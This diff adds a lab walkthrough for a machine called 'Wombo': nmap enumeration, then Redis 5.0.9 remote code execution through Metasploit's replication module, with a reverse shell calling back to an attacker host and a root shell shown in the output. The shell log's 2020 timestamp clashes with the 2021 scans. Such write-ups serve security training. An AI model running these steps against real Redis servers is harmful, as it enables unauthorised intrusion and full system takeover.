@@ -1,0 +1,98 @@
+Exploitation Guide for Wombo
+Summary
+
+This machine is exploited via a remote code execution vulnerability in a Redis data store.
+Enumeration
+Nmap
+
+We start off by running an nmap scan against all TCP ports:
+
+kali@kali:~$ sudo nmap -p- 192.168.83.214
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-02 04:04 EST
+Nmap scan report for 192.168.83.214
+Host is up (0.063s latency).
+Not shown: 65529 filtered ports
+PORT      STATE  SERVICE
+22/tcp    open   ssh
+53/tcp    closed domain
+80/tcp    open   http
+6379/tcp  open   redis
+8080/tcp  open   http-proxy
+27017/tcp open   mongod
+
+We see that port 6379 is identified as redis. Let’s run a more aggressive scan against it:
+
+kali@kali:~$ sudo nmap -p 6379 -sV -A 192.168.83.214
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-02 04:09 EST
+Nmap scan report for 192.168.83.214
+Host is up (0.068s latency).
+
+PORT     STATE SERVICE VERSION
+6379/tcp open  redis   Redis key-value store 5.0.9
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.82 seconds
+
+This scan shows that the version of the Redis store service is 5.0.9.
+Exploitation
+RCE
+
+Searching for exploits for this version reveals a remote code execution vulnerability:
+
+kali@kali:~$ searchsploit redis
+...
+Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)
+...
+
+We can use Metasploit to exploit this service as follows:
+
+kali@kali:~$ msfconsole
+...
+msf5 > use linux/redis/redis_replication_cmd_exec
+msf5 exploit(linux/redis/redis_replication_cmd_exec) > show options
+
+Module options (exploit/linux/redis/redis_replication_cmd_exec):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   CUSTOM    true             yes       Whether compile payload file during exploiting
+   PASSWORD  foobared         no        Redis password for authentication test
+   RHOSTS    192.168.83.214   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT     6379             yes       The target port (TCP)
+   SRVHOST   192.168.83.129   yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT   6379             yes       The local port to listen on.
+
+
+Payload options (linux/x64/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.83.129   yes       The listen address (an interface may be specified)
+   LPORT  8080             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(linux/redis/redis_replication_cmd_exec) > run
+
+[*] Started reverse TCP handler on 192.168.83.129:8080 
+[*] 192.168.83.214:6379   - Compile redis module extension file
+[+] 192.168.83.214:6379   - Payload generated successfully! 
+[*] 192.168.83.214:6379   - Listening on 192.168.83.129:6379
+[*] 192.168.83.214:6379   - Rogue server close...
+[*] 192.168.83.214:6379   - Sending command to trigger payload.
+[*] Command shell session 2 opened (192.168.83.129:8080 -> 192.168.83.214:59796) at 2020-04-24 15:19:25 +0800
+[!] 192.168.83.214:6379   - This exploit may require manual cleanup of './fkyrakg.so' on the target
+id
+
+uid=0(root) gid=0(root) groups=0(root)
+
+Escalation
+
+As we have already obtained a root shell, no privilege escalation is required.
+
